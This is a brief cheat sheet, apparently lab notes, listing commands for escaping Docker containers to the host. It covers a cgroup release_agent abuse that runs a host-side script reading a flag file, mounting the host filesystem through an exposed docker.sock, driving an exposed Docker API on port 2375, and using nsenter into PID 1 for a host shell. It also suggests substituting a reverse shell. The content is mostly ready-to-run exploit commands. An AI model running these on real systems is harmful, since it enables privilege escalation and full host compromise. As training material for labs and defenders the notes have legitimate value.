# Linux Docker container priv escalation

## Exploit privlidged capabilities


1. capsh --print
Check capabilities first

2.
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.

## Exploiting docker socket

1. ls -la /var/run | grep sock
srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock

confirm you can run docker commands (be root in container or be in docker group as a lower-privileged user)
 
2. docker run -v /:/mnt --rm -it alpine chroot /mnt sh

## Exposed Docker port 2375

1. curl http://10.10.85.243:2375/version

2. docker -H tcp://10.10.85.243:2375 ps

Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further.

## Namespace abuse

For this vulnerability, we will be using nsenter (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "/sbin/init" process on the host, meaning that we can launch new commands such as a bash shell on the host. 

Use the following exploit: nsenter --target 1 --mount --uts --ipc --net /bin/bash
